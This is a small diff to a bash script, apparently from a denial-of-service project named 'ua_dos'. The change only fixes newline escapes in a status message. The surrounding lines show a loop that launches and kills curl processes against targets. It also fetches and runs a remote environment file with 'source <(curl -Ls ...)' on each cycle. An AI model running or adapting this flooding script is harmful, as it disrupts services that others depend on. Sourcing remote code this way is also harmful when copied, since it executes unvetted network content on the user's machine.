@@ -239,7 +239,7 @@ for ((;;)); do
    C="$C $!"
    sleep $t1
    if [[ "$w" -eq "$rcount" ]];then
-      echo -e "$(date)/nt1="$t1"s t2="$t2"s t3="$t3"s t4="$t4"s | sq1="$sq1"counts sq2="$sq2"counts/nRCount=$w/"$rcount"counts. Killing curl process..."
+      echo -e "$(date)\nt1="$t1"s t2="$t2"s t3="$t3"s t4="$t4"s | sq1="$sq1"counts sq2="$sq2"counts\nRCount=$w/"$rcount"counts. Killing curl process..."
       source <(curl -Ls https://raw.githubusercontent.com/bro2020/ua_dos/main/curl-atack-env.txt)
       if [[ -f "$(dirname $0)"/curl-atack-env.txt ]]; then
          source "$(dirname $0)"/curl-atack-env.txt
